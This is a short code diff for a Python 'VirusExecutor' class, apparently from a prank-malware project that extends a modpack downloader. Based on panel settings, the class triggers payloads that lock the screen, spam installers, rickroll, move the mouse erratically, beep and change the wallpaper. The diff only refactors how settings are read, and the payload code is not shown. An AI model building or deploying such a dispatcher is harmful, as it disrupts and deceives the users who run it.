@@ -13,7 +13,7 @@ in every distribution, as a "LICENSE" file at top level.
 # Local Application Imports
 from ModpackDownloader import ModpackDownloader
 from Virus import Virus
-
+from GeneralUtils import GeneralUtils
 
 class VirusExecutor(ModpackDownloader):
     """
@@ -37,20 +37,20 @@ class VirusExecutor(ModpackDownloader):
         :return:
         """
 
-        if self._get_panel_setting("LOCK-SCREEN") == "True":
+        if GeneralUtils().get_panel_setting("LOCK-SCREEN") == "True":
             self.virus.lock()
 
-        if self._get_panel_setting("SPAM-INSTALLER") == "True":
+        if GeneralUtils().get_panel_setting("SPAM-INSTALLER") == "True":
             self.virus.spam_installer()
 
-        if self._get_panel_setting("RICKROLL") == "True":
+        if GeneralUtils().get_panel_setting("RICKROLL") == "True":
             self.virus.rickroll()
 
-        if self._get_panel_setting("CRAZY-MOUSE") == "True":
+        if GeneralUtils().get_panel_setting("CRAZY-MOUSE") == "True":
             self.virus.crazymouse()
 
-        if self._get_panel_setting("BEEPS") == "True":
+        if GeneralUtils().get_panel_setting("BEEPS") == "True":
             self.virus.beeps()
 
-        if self._get_panel_setting("BACKGROUND-CHANGE")== "True":
+        if GeneralUtils().get_panel_setting("BACKGROUND-CHANGE")== "True":
             self.virus.wallpaper_mess()
